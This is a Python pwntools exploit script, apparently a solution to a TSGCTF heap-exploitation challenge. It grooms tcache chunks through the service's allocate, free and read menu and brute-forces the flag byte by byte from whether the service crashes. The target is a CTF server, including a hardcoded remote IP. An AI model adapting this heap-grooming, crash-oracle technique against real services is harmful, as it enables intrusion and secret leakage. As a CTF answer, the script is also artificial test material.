from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "35.221.81.216"
    port = 30001
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

def solve(idx, c):
    r = remote(host, port)

    def recvuntil(x, verbose=True):
        s = r.recvuntil(x)
        if log and verbose:
            print(s)
        return s.strip(x)

    def recv(verbose=True):
        s = r.recv()
        if log and verbose:
            print(s)
        return s

    def recvline(verbose=True):
        s = r.recvline()
        if log and verbose:
            print(s)
        return s.strip('\n')

    def sendline(s, verbose=True):
        if log and verbose:
            pass
            #print(s)
        r.sendline(s)

    def send(s, verbose=True):
        if log and verbose:
            print(s, end='')
        r.send(s)

    def interactive():
        r.interactive()

    ####################################

    def menu(choice):
        recvuntil('>')
        sendline(str(choice))

    # receive and send
    def rs(r, s, new_line=True):
        recvuntil(r)
        if new_line:
            sendline(s)
        else:
            send(s)


    def alloc(index, size, data):
        menu(0)
        recvuntil('index >')
        sendline(str(index))
        recvuntil('size >')
        sendline(str(size))
        recvuntil('data >')
        sendline(data)

    def dealloc(index):
        menu(1)
        recvuntil('index >')
        sendline(str(index))

    def read(index, idx):
        menu(2)
        recvuntil('index >')
        sendline(str(index))
        recvuntil('at >')
        sendline(str(idx))


    recvuntil('index >')
    sendline(str(idx))

    size = 0x20

    # pad
    alloc(0, 0x30, '')
    dealloc(0)

    for i in range(7):
        alloc(0, 10, '')
        dealloc(0)

    alloc(0, 10, '')
    dealloc(0)  # for overwrite d3b0

    for i in range(7):
        alloc(0, size, '')
        dealloc(0)

    nums = '0123456789'
    alphas = 'abcdef'
    if c in nums:
        alloc(0, size, '\x00'*8 + '\x00' * nums.find(c) + '\x31') # d520
        alloc(1, size, '')
    elif c in alphas:
        alloc(0, size, '')
        alloc(1, size, '\x00'*(16 + 9) + '\x00' * alphas.find(c) + '\x31') # d550
    else:
        print('invalid')
        import sys
        sys.exit(-1)
    dealloc(0)
    dealloc(1)

    alloc(0, 10, '')
    read(0, 0x1a0)

    if c in alphas:
        alloc(1, size, '\x00'*9 + '\x00' * alphas.find(c) + '\x31') # d550
    else:
        alloc(0, size, '')
    try:
        alloc(0, size, '')
    except:
        r.close()
        return False
    r.close()
    return True

#print(solve(9, 'f'))

s = 'TSGCTF{'
for i in range(7, 39):
    print(i, end=' ')
    for c in '0123456789abcdef':
        if solve(i, c):
            s += c
            break
    else:
        print('fail')
        import sys
        sys.exit(-1)
s += '}'

print('solved!')
print(s)
